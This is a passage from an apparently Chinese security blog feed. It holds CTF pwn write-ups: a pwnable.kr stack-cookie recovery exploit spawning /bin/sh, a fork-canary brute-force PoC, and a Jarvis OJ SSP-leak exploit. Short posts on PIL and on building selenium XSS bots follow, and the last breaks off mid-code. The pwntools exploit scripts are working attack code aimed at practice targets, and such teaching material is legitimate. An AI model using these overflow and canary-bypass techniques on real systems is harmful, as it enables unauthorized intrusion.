 <span class="keyword">char</span> v3[<span class="number">32</span>]; <span class="comment">// [sp+Ch] [bp-2Ch]@2</span></div><div class="line">  <span class="keyword">int</span> v4; <span class="comment">// [sp+2Ch] [bp-Ch]@1</span></div><div class="line"></div><div class="line">  v4 = *MK_FP(__GS__, <span class="number">20</span>);</div><div class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">7</span>; ++i )</div><div class="line">    *(_DWORD *)&amp;v3[<span class="number">4</span> * i] = rand();</div><div class="line">  result = *(_DWORD *)&amp;v3[<span class="number">16</span>]</div><div class="line">         - *(_DWORD *)&amp;v3[<span class="number">24</span>]</div><div class="line">         + *(_DWORD *)&amp;v3[<span class="number">28</span>]</div><div class="line">         + v4</div><div class="line">         + *(_DWORD *)&amp;v3[<span class="number">8</span>]</div><div class="line">         - *(_DWORD *)&amp;v3[<span class="number">12</span>]</div><div class="line">         + *(_DWORD *)&amp;v3[<span class="number">4</span>]</div><div class="line">         + *(_DWORD *)&amp;v3[<span class="number">20</span>];</div><div class="line">  v1 = *MK_FP(__GS__, <span class="number">20</span>) ^ v4;</div><div class="line">  <span class="keyword">return</span> result;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>在这个函数中，栈cookie被用来生成了一个hash值，而这个hash值会在交互中给出，结合题目中提到的提示，bin服务和pwnable.kr运行在同一台机器上，也就是说时间相同，这样就可以反算出栈cookie，从而get shell了。</p>
<p>大概思路清晰之后，开始完成exp，首先是用c算出栈cookie</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span> </span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">int</span> m = atoi(argv[<span class="number">2</span>]);</div><div class="line">    <span class="keyword">int</span> rands[<span class="number">8</span>];</div><div class="line">    srand(atoi(argv[<span class="number">1</span>]));</div><div class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt;= <span class="number">7</span>; i++) rands[i] = rand();</div><div class="line">    m -= (rands[<span class="number">1</span>] + rands[<span class="number">2</span>] - rands[<span class="number">3</span>] + rands[<span class="number">4</span>] + rands[<span class="number">5</span>] - rands[<span class="number">6</span>] + rands[<span class="number">7</span>]);</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"%x\n"</span>, m);</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>完成cookie的计算，分析到这里就可以写exp了，主要思路是溢出掉v3，用验证码和时间计算出栈cookie，最后调用system(&quot;/bin/sh&quot;)</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> os</div><div class="line"><span class="keyword">import</span> time</div><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"></div><div class="line">p = remote(<span class="string">"pwnable.kr"</span>, <span class="number">9002</span>)</div><div class="line">t = int(time.time())</div><div class="line"><span class="keyword">print</span> p.recvuntil(<span class="string">"captcha"</span>)</div><div class="line">captcha = p.recvline()</div><div class="line">captchapos = captcha.find(<span class="string">' : '</span>)+len(<span class="string">' : '</span>)</div><div class="line">captcha = captcha[captchapos:].strip()</div><div class="line">p.sendline(captcha)</div><div class="line"><span class="keyword">print</span> p.recvline()</div><div class="line"><span class="keyword">print</span> p.recvline()</div><div class="line">cmd = <span class="string">"./hash %s %s"</span> % (t, captcha)</div><div class="line">cookie = <span class="string">"0x"</span> + os.popen(cmd).read().strip()</div><div class="line"></div><div class="line">payload = <span class="string">'A'</span> * <span class="number">512</span> <span class="comment"># 512 byte v3</span></div><div class="line">payload += p32(int(cookie, <span class="number">16</span>))</div><div class="line">payload += <span class="string">'A'</span> * <span class="number">12</span></div><div class="line">payload += p32(<span class="number">0x08049187</span>)  <span class="comment"># system</span></div><div class="line">payload += p32(<span class="number">0x0804B0E0</span> + <span class="number">537</span>*<span class="number">4</span>/<span class="number">3</span>)  <span class="comment"># .bss =&gt; address of /bin/sh</span></div><div class="line">payload = b64e(payload)</div><div class="line">payload += <span class="string">"/bin/sh\0"</span></div><div class="line">p.sendline(payload)</div><div class="line">p.interactive()</div></pre></td></tr></table></figure>
<hr>
<h2 id="绕过canary-针对fork的进程"><a href="#绕过canary-针对fork的进程" class="headerlink" title="绕过canary - 针对fork的进程"></a>绕过canary - 针对fork的进程</h2><p>对fork而言，作用相当于自我复制，每一次复制出来的程序，内存布局都是一样的，当然canary值也一样。那我们就可以逐位爆破，如果程序GG了就说明这一位不对，如果程序正常就可以接着跑下一位，直到跑出正确的canary。</p>
<p>另外有一点就是canary的最低位是0x00，这么做为了防止canary的值泄漏。比如在canary上面是一个字符串，正常来说字符串后面有0截断，如果我们恶意写满字符串空间，而程序后面又把字符串打印出来了，那个由于没有0截断canary的值也被顺带打印出来了。设计canary的人正是考虑到了这一点，就让canary的最低位恒为零，这样就不存在上面截不截断的问题了。</p>
<p>示例程序：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div></pre></td><td class="code"><pre><div class="line">/**</div><div class="line">* compile cmd: gcc source.c -m32 -o bin</div><div class="line">**/</div><div class="line">#include &lt;stdio.h&gt;</div><div class="line">#include &lt;unistd.h&gt;</div><div class="line">#include &lt;stdlib.h&gt;</div><div class="line">#include &lt;sys/wait.h&gt;</div><div class="line"></div><div class="line">void getflag(void) &#123;</div><div class="line">    char flag[100];</div><div class="line">    FILE *fp = fopen(&quot;./flag&quot;, &quot;r&quot;);</div><div class="line">    if (fp == NULL) &#123;</div><div class="line">        puts(&quot;get flag error&quot;);</div><div class="line">		exit(0);</div><div class="line">    &#125;   </div><div class="line">    fgets(flag, 100, fp);</div><div class="line">    puts(flag);</div><div class="line">&#125;</div><div class="line">void init() &#123;</div><div class="line">    setbuf(stdin, NULL);</div><div class="line">    setbuf(stdout, NULL);</div><div class="line">    setbuf(stderr, NULL);</div><div class="line">&#125;</div><div class="line"></div><div class="line">void fun(void) &#123;</div><div class="line">    char buffer[100];</div><div class="line">    read(STDIN_FILENO, buffer, 120);</div><div class="line">&#125;</div><div class="line"></div><div class="line">int main(void) &#123;</div><div class="line">    init();</div><div class="line">	pid_t pid;</div><div class="line">	while(1) &#123;</div><div class="line">		pid = fork();</div><div class="line">		if(pid &lt; 0) &#123;</div><div class="line">			puts(&quot;fork error&quot;);</div><div class="line">			exit(0);</div><div class="line">		&#125;</div><div class="line">		else if(pid == 0) &#123;</div><div class="line">			puts(&quot;welcome&quot;);</div><div class="line">			fun();</div><div class="line">			puts(&quot;recv sucess&quot;);</div><div class="line">		&#125;</div><div class="line">		else &#123;</div><div class="line">			wait(0);</div><div class="line">		&#125;</div><div class="line">	&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>poc脚本：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">from pwn import *</div><div class="line">context.log_level = &apos;debug&apos;</div><div class="line"></div><div class="line">cn = process(&apos;./bin&apos;)</div><div class="line"></div><div class="line">cn.recvuntil(&apos;welcome\n&apos;)</div><div class="line">canary = &apos;\x00&apos;</div><div class="line">for j in range(3):</div><div class="line">    for i in range(0x100):</div><div class="line">        cn.send(&apos;a&apos;*100 + canary + chr(i))</div><div class="line">        a = cn.recvuntil(&apos;welcome\n&apos;)</div><div class="line">        if &apos;recv&apos; in a:</div><div class="line">            canary += chr(i)</div><div class="line">            break</div><div class="line"></div><div class="line">cn.sendline(&apos;a&apos;*100 + canary + &apos;a&apos;*12 + p32(0x0804864d))</div><div class="line"></div><div class="line">flag = cn.recv()</div><div class="line">cn.close()</div><div class="line">log.success(&apos;flag is:&apos; + flag)</div></pre></td></tr></table></figure>
<hr>
<h2 id="故意触发canary-ssp-leak"><a href="#故意触发canary-ssp-leak" class="headerlink" title="故意触发canary - ssp leak"></a>故意触发canary - ssp leak</h2><p>这题可以参考jarvis oj中 smashes一题的解题方法中的前一半。</p>
<p>这里我偷个懒，直接把之前写的wp扔过来了，反正原理都在题里了。</p>
<p>题目描述：</p>
<blockquote>
<p>Smashes, try your best to smash!!!</p>
<p>nc pwn.jarvisoj.com 9877</p>
<p><a href="https://dn.jarvisoj.com/challengefiles/smashes.44838f6edd4408a53feb2e2bbfe5b229" target="_blank" rel="external">smashes.44838f6edd4408a53feb2e2bbfe5b229</a></p>
</blockquote>
<p>首先查看保护</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">$ checksec pwn_smashes </div><div class="line">[*] &apos;/home/veritas/pwn/jarvisoj/smashes/pwn_smashes&apos;</div><div class="line">    Arch:     amd64-64-little</div><div class="line">    RELRO:    No RELRO</div><div class="line">    Stack:    Canary found</div><div class="line">    NX:       NX enabled</div><div class="line">    PIE:      No PIE (0x400000)</div><div class="line">    FORTIFY:  Enabled</div></pre></td></tr></table></figure>
<p>有canary，有nx</p>
<p>ida找到关键函数：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line">__int64 func_1()</div><div class="line">&#123;</div><div class="line">  __int64 v0; // rax@1</div><div class="line">  __int64 v1; // rbx@2</div><div class="line">  int v2; // eax@3</div><div class="line">  __int64 buffer; // [sp+0h] [bp-128h]@1</div><div class="line">  __int64 canary; // [sp+108h] [bp-20h]@1</div><div class="line"></div><div class="line">  canary = *MK_FP(__FS__, 40LL);</div><div class="line">  __printf_chk(1LL, (__int64)&quot;Hello!\nWhat&apos;s your name? &quot;);</div><div class="line">  LODWORD(v0) = _IO_gets(&amp;buffer);</div><div class="line">  if ( !v0 )</div><div class="line">label_exit:</div><div class="line">    _exit(1);</div><div class="line">  v1 = 0LL;</div><div class="line">  __printf_chk(1LL, (__int64)&quot;Nice to meet you, %s.\nPlease overwrite the flag: &quot;);</div><div class="line">  while ( 1 )</div><div class="line">  &#123;</div><div class="line">    v2 = _IO_getc(stdin);</div><div class="line">    if ( v2 == -1u )</div><div class="line">      goto label_exit;</div><div class="line">    if ( v2 == &apos;\n&apos; )</div><div class="line">      break;</div><div class="line">    flag[v1++] = v2;</div><div class="line">    if ( v1 == 32 )                             // 32长度</div><div class="line">      goto thank_you;</div><div class="line">  &#125;</div><div class="line">  memset((void *)((signed int)v1 + 0x600D20LL), 0, (unsigned int)(32 - v1));</div><div class="line">thank_you:</div><div class="line">  puts(&quot;Thank you, bye!&quot;);</div><div class="line">  return *MK_FP(__FS__, 40LL) ^ canary;</div></pre></td></tr></table></figure>
<p>首先，函数使用了gets(的某种形态？)来获取输入，好处是我们可以输入无限长度的字符串，坏处是发送过去的字符串的尾部会以<code>\n</code>结尾，所以无法绕过canary。</p>
<p>纵观整个程序，似乎没有什么地方能够绕过canary，也没有什么地方能打印flag。</p>
<p>但如果你换个思路，我们故意触发canary的保护会怎么样？</p>
<p>事实上，就有一种攻击方法叫做<code>SSP（Stack Smashing Protector ） leak</code>。</p>
<hr>
<p>如果canary被我们的值覆盖而发生了变化，程序会执行函数<code>___stack_chk_fail()</code></p>
<p><img src="/images/2017-09-23/canary_7a0eddd01d532e95ac8a905e617c70b4.png" alt="img"></p>
<p>一般情况下，我们执行了这个函数，输出是这样的：</p>
<p><img src="/images/2017-09-23/canary_c0f71a7d08460009b1ff313dcdbf0294.png" alt="img"></p>
<p>我们来看一下源码<br>__stack_chk_fail :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">void </div><div class="line">__attribute__ ((noreturn)) </div><div class="line">__stack_chk_fail (void) &#123;   </div><div class="line">	__fortify_fail (&quot;stack smashing detected&quot;); </div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>fortify_fail</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">void </div><div class="line">__attribute__ ((noreturn)) </div><div class="line">__fortify_fail (msg)</div><div class="line">   const char *msg; &#123;</div><div class="line">      /* The loop is added only to keep gcc happy. */</div><div class="line">         while (1)</div><div class="line">              __libc_message (2, &quot;*** %s ***: %s terminated\n&quot;, msg, __libc_argv[0] ?: &quot;&lt;unknown&gt;&quot;) </div><div class="line">&#125; </div><div class="line">libc_hidden_def (__fortify_fail)</div></pre></td></tr></table></figure>
<p>可见，__libc_message 的第二个<code>%s</code>输出的是argv[0]，argv[0]是指向第一个启动参数字符串的指针，而在栈中，大概是这样一个画风</p>
<p><img src="/images/2017-09-23/canary_a768142147ca3976598941b5c6c67161.png" alt="img"></p>
<p>所以，只要我们能够输入足够长的字符串覆盖掉argv[0]，我们就能让canary保护输出我们想要地址上的值。</p>
<p>听起来很美妙，我们可以试试看。</p>
<p>先写如下poc:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line">from pwn import *</div><div class="line">context.log_level = &apos;debug&apos;</div><div class="line"></div><div class="line">#cn = remote(&apos;pwn.jarvisoj.com&apos;, 9877)</div><div class="line">cn = process(&apos;pwn_smashes&apos;)</div><div class="line">cn.recv()</div><div class="line">cn.sendline(p64(0x0000000000400934)*200) #直接用我们所需的地址占满整个栈</div><div class="line">cn.recv()</div><div class="line">cn.sendline()</div><div class="line">cn.recv()</div><div class="line"></div><div class="line">#.rodata:0000000000400934 aHelloWhatSYour db &apos;Hello!&apos;,0Ah         ; DATA XREF: func_1+1o</div><div class="line">#.rodata:0000000000400934                 db &apos;What&apos;,27h,&apos;s your name? &apos;,0</div><div class="line">#.rodata:000000000040094E ; char s[]</div><div class="line">#.rodata:000000000040094E s               db &apos;Thank you, bye!&apos;,0  ; DATA XREF: func_1:loc_400878o</div><div class="line">#.rodata:000000000040095E                 align 20h</div><div class="line">#.rodata:0000000000400960 aNiceToMeetYouS db &apos;Nice to meet you, %s.&apos;,0Ah</div><div class="line">#.rodata:0000000000400960                                         ; DATA XREF: func_1+3Fo</div><div class="line">#.rodata:0000000000400960                 db &apos;Please overwrite the flag: &apos;,0</div><div class="line">#.rodata:0000000000400992                 align 8</div><div class="line">#.rodata:0000000000400992 _rodata         ends</div></pre></td></tr></table></figure>
<p>输出结果令我们满意</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">[DEBUG] Received 0x56 bytes:</div><div class="line">    &apos;Thank you, bye!\n&apos;</div><div class="line">    &apos;*** stack smashing detected ***: Hello!\n&apos;</div><div class="line">    &quot;What&apos;s your name?  terminated\n&quot;</div></pre></td></tr></table></figure>
<p>但是，当我们把地址换成flag的地址时，却可以发现flag并没有被打印出来，那是因为在func_1函数的结尾处有这样一句：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">memset((void *)((signed int)v1 + 0x600D20LL), 0, (unsigned int)(32 - v1));</div></pre></td></tr></table></figure>
<p>所以，无论如何，等我们利用canary打印flag的时候，0x600D20上的值已经被完全覆盖了，因此我们无法从0x600D20处得到flag。</p>
<p>这就是这道题的第二个考点，ELF的重映射。当可执行文件足够小的时候，他的不同区段可能会被多次映射。这道题就是这样。</p>
<p><img src="/images/2017-09-23/canary_b17d7868f95d135b35908e74805b7282.png" alt="img"></p>
<p>可见，其实在0x400d20处存在flag的备份。</p>
<p>因此，最终的poc为：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">from pwn import *</div><div class="line">context.log_level = &apos;debug&apos;</div><div class="line"></div><div class="line">cn = remote(&apos;pwn.jarvisoj.com&apos;, 9877)</div><div class="line">#cn = process(&apos;pwn_smashes&apos;)</div><div class="line">cn.recv()</div><div class="line">cn.sendline(p64(0x0400d20)*200)</div><div class="line">cn.recv()</div><div class="line">cn.sendline()</div><div class="line">cn.recv()</div></pre></td></tr></table></figure>]]></content>
      
        <categories>
            
            <category> pwn </category>
            
        </categories>
        
        
        <tags>
            
            <tag> stack </tag>
            
            <tag> canary </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Python的图片处理库PIL]]></title>
      <url>/2017/09/21/Python%E7%9A%84%E5%9B%BE%E7%89%87%E5%A4%84%E7%90%86%E5%BA%93PIL/</url>
      <content type="html"><![CDATA[<p>PIL 是Python Image Library的缩写，意思即为Python的图片处理库</p>
<p>PIL的官方文档是<a href="http://effbot.org/imagingbook/pil-index.htm" target="_blank" rel="external">http://effbot.org/imagingbook/pil-index.htm</a></p>
<p>内容很全，也不需赘述</p>
]]></content>
      
        <categories>
            
            <category> code </category>
            
        </categories>
        
        
        <tags>
            
            <tag> python </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[xss bot介绍]]></title>
      <url>/2017/09/21/xss-bot%E4%BB%8B%E7%BB%8D/</url>
      <content type="html"><![CDATA[<p>这篇文章摘抄与LoRexxar的的博客<a href="https://lorexxar.cn/2017/05/12/xss-bot2/" target="_blank" rel="external">https://lorexxar.cn/2017/05/12/xss-bot2/</a></p>
<p>bot是什么？原意是robot的意思，也指一个在没有人工干预下在因特网上搜索信息的程序。这里的xss bot指的是：将攻击者提供的攻击代码在服务器上模拟执行的程序。</p>
<p>因此xss bot应该具有较强的稳定性！</p>
<p>xss在近几年的ctf形式中，越来越受到了人们的重视，但是出xss的题目最重要的可能就是xss bot的问题了，一个合格的xss bot要稳定还能避免搅屎。</p>
<p>下面我们就来看看一个xss bot是怎么完成的。</p>
<h1 id="bot之前"><a href="#bot之前" class="headerlink" title="bot之前"></a>bot之前</h1><p>一般来说，对于xss bot来说，最重要的是要bot能够执行js，事情的本质是我们需要一个浏览器内核来解析js，这里我们一般会用<code>selenium+webdriver</code>。</p>
<p>而webdriver一般有3种chrome webdriver、firefox webdriver、phantomjs。</p>
<h2 id="selenium"><a href="#selenium" class="headerlink" title="selenium"></a>selenium</h2><p>selenium是用来控制webdriver的接口的，网上搜到的大部分脚本大部门都是java控制的，下面我的所有脚本都使用python操作selenium，下面有份不太完整的文档。</p>
<p><a href="http://www.seleniumhq.org/docs/03_webdriver.jsp" target="_blank" rel="external">http://www.seleniumhq.org/docs/03_webdriver.jsp</a></p>
<p>只要在python文件前引入selenium模块。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">import selenium</div><div class="line">from selenium import webdriver  </div><div class="line">from selenium.webdriver.common.keys import Keys  </div><div class="line">from selenium.common.exceptions import WebDriverException</div></pre></td></tr></table></figure>
<h2 id="chrome-webdriver"><a href="#chrome-webdriver" class="headerlink" title="chrome webdriver"></a>chrome webdriver</h2><p>如果我们想要使用chrome webdriver，除了安装chrome浏览器本身，还需要安装webdriver。</p>
<p><a href="https://sites.google.com/a/chromium.org/chromedriver/downloads" target="_blank" rel="external">https://sites.google.com/a/chromium.org/chromedriver/downloads</a></p>
<p>由于webdriver版本众多，api和语法也有所不同，这里推荐最新版chrome+最新版webdriver。</p>
<p>因为环境相异，所以我们可能需要在脚本里设置chrome webdriver的路径</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">#!/usr/bin/env python</div><div class="line"># -*- coding:utf-8 -*-</div><div class="line">import selenium</div><div class="line">from selenium import webdriver  </div><div class="line">from selenium.webdriver.common.keys import Keys  </div><div class="line">from selenium.common.exceptions import WebDriverException</div><div class="line">import os </div><div class="line"></div><div class="line">chromedriver = &quot;C:\Users\Administrator\AppData\Local\Google\Chrome\Application\chromedriver.exe&quot;  </div><div class="line">os.environ[&quot;webdriver.chrome.driver&quot;] = chromedriver  </div><div class="line">browser = webdriver.Chrome(chromedriver)  </div><div class="line">url = &quot;http://xxxx&quot;  	</div><div class="line">browser.get(url)</div><div class="line">browser.quit()</div></pre></td></tr></table></figure>
<h2 id="firefox-webdriver"><a href="#firefox-webdriver" class="headerlink" title="firefox webdriver"></a>firefox webdriver</h2><p>firefox和chrome相同，需要一个geckodriver来支持，和chrome类似。</p>
<p><a href="https://github.com/mozilla/geckodriver/releases/" target="_blank" rel="external">https://github.com/mozilla/geckodriver/releases/</a></p>
<p>在linux下，需要添加映射到/bin/</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">chmod +x geckodriver</div></pre></td></tr></table></figure>
<p>在windows下，需要添加geckodriver到环境变量中。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">#!/usr/bin/env python</div><div class="line"># -*- coding:utf-8 -*-</div><div class="line">import selenium</div><div class="line">from selenium import webdriver  </div><div class="line">from selenium.webdriver.common.keys import Keys  </div><div class="line">from selenium.common.exceptions import WebDriverException</div><div class="line"></div><div class="line">browser = webdriver.Firefox()</div><div class="line"></div><div class="line">url = &quot;http://xxxx&quot;  	</div><div class="line">browser.get(url)</div><div class="line">browser.quit()</div></pre></td></tr></table></figure>
<h2 id="phantomjs"><a href="#phantomjs" class="headerlink" title="phantomjs"></a>phantomjs</h2><p>phantomjs和别的浏览器本质上没什么区别，差不多也是类似于浏览器的内核，优势其实是多平台支持，而且不需要浏览器支持，所以一般爬虫用的比较多。</p>
<p>下载地址<br><a href="http://phantomjs.org/download.html" target="_blank" rel="external">http://phantomjs.org/download.html</a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">#!/usr/bin/env python</div><div class="line"># -*- coding:utf-8 -*-</div><div class="line">import selenium</div><div class="line">from selenium import webdriver</div><div class="line">from selenium.common.exceptions import WebDriverException</div><div class="line"></div><div class="line">phantomjs_path = &quot;sssssssss/phantomjs&quot;</div><div class="line">driver = webdriver.PhantomJS(executable_path=phantomjs_path)</div><div class="line"></div><div class="line">url = &quot;http://xxxx&quot;  	</div><div class="line">browser.get(url)</div><div class="line">browser.quit()</div></pre></td></tr></table></figure>
<h1 id="bot的背后"><a href="#bot的背后" class="headerlink" title="bot的背后"></a>bot的背后</h1><p>比起爬虫来不一样，因为一个爬虫只要打开一次获取数据就好了，但是作为xss bot必须周期性的打开页面，执行攻击者的相应payload，既然bot的持续时间一般是24小时-48小时，那bot就不可能时时刻刻都有人盯着，也就必须放在服务器上，我们来研究一下不同的webdriver在服务器的差异。</p>
<p>chrome和firefox的webdriver都有一个特点，就是需要桌面，如果执行脚本的服务器上不包含桌面，那么我就需要别的方法来构造一个虚拟的桌面。</p>
<p>如果在windows服务器上，windows服务器最大的特点就是自带桌面，我们一般通过rdp管理，所以windows服务器上跑xss bot的话不需要做专门的处理。</p>
<p>如果在linux服务器上，我们一般通过ssh管理linux服务器，那么我就需要一段神秘代码来执行xss bot脚本，这是一段火日聚聚教我的代码。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">from pyvirtualdisplay import Display</div><div class="line"></div><div class="line">display = Display(visible=0, size=(800,800))</div><div class="line">display.start()</div></pre></td></tr></table></figure>
<p>在phantomjs的webdriver下，就不会有这样的问题，因为phantomjs本身就是多平台的，只是很多时候xss bot需要保证浏览器的特性，这种时候，我们往往不会使用phantomjs作为xss bot的首选。</p>
<h1 id="完成bot"><a href="#完成bot" class="headerlink" title="完成bot"></a>完成bot</h1><p>上面我们着重讲了各种webdriver，下面我就来针对不同的xss题目来谈谈。</p>
<h2 id="report-bug型xss"><a href="#report-bug型xss" class="headerlink" title="report bug型xss"></a>report bug型xss</h2><p>一般来说，xss题目最常见的就是report bug或者是留言型xss，后台接口唯一，攻击者向目标发送信息，bot需要访问页面执行js。</p>
<p>在ctf比赛中，处理方式五花八门，这里我推荐1种解决办法。</p>
<p>在攻击者页面提供测试接口和攻击接口，然后攻击者接口设置验证码，避免攻击者无意义的刷payload。（具体可以见0ctf的处理方式）</p>
<p>为了避免干扰，最好将攻击者攻击数据存入数据库，添加标志位以判断数据是否被访问过，题目专门添加功能用作check数据库内是否存在未访问数据（最好添加此功能在题目中，因为bot有可能不在题目服务器，远程数据库连接是个危险的行为！！）</p>
<p>判断存在时，bot开启webdriver访问相应的页面（通过添加cookie或者ip check的方式判断访问来源），相应的页面从数据库取出数据，bot访问完成后关闭。</p>
<p>大致流程如下：</p>
<p><img src="/images/2017-09-21/image_1bepoa4nsjb91ipsli170tclt9.png" alt="image_1bepoa4nsjb91ipsli170tclt9.png-31.8kB"></p>
<p>我这里贴上bot部分的代码</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div 